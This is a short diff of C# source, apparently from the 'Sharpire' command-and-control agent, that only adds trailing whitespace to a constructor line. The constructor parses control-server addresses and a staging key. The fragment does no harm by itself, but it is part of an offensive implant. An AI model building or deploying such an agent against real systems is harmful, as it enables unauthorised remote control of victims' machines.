@@ -626,7 +626,7 @@ namespace Sharpire
 
         public SessionInfo(string[] args)
         {
-            ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+            ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);  
             StagingKey = args[1];
             AgentLanguage = args[2];
             StagingKeyBytes = Encoding.ASCII.GetBytes(StagingKey);
